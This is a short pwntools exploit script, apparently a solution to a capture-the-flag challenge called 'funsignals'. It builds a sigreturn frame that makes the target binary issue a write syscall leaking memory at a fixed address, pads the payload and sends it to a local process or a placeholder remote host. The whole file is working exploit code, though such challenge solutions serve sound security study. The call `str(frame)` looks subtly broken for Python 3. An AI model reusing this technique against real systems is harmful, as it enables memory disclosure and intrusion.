#!/usr/bin/env python3

from pwn import *

exe = ELF("./funsignals_player_bin")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    frame = SigreturnFrame(arch = "amd64")
    frame.rip = 0x000000001000000b
    frame.rax = 1 # write
    frame.rdi = 1
    frame.rsi = 0x10000023
    frame.rdx = 200
    r.send(str(frame) + "A" * (0x400 - len(frame)))
    r.interactive()


if __name__ == "__main__":
    main()
